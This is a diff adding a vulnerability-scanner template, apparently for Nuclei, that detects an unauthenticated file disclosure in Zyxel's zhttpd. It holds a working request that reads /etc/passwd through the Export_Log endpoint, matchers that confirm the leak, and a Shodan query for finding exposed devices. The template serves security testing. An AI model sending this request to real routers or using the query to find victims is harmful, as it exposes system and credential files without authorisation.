@@ -1,0 +1,39 @@
+id: unauth-lfd-zhttpd
+
+info:
+  name: zhttpd - Unauthenticated Local File Disclosure
+  author: EvergreenCartoons
+  severity: high
+  description: |
+    An endpoint in zhttpd can be used to expose system files including "/etc/passwd" and "/etc/shadow". This endpoint is accessible without prior login. An attacker can read all files on the system by using this endpoint.
+  reference:
+    - https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/
+    - https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/
+    - https://github.com/rapid7/metasploit-framework/pull/17388
+  metadata:
+    verified: "true"
+    shodan-query: http.html:"VMG1312-B10D"
+  tags: misconfig,unauth,zyxel,lfi
+
+requests:
+  - raw:
+      - |
+        GET /Export_Log?/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - 'application/octet-stream'
+
+      - type: status
+        status:
+          - 200
